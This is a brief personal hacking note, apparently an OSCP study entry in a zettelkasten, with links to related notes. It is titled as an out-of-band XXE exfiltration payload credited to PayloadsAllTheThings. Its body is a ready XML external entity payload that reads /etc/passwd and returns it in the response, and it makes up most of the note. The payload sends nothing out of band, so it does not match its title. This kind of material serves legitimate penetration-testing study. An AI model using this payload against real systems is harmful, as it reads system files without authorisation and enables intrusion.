# XXE xml external entity exfiltrate file out of band payload
PayloadsAllTheThings
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

` zet/20221003150974/README.md `

# Related

- [20221014185739](/zet/20221014185739/README.md) kb file named kb/hacking/methodology/XXE.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub
- [20221003150975](/zet/20221003150975/README.md) XXE xml external entity
- ~/kb/hacking/methodology/XXE.md

Tags:

    #hacking #xxe 
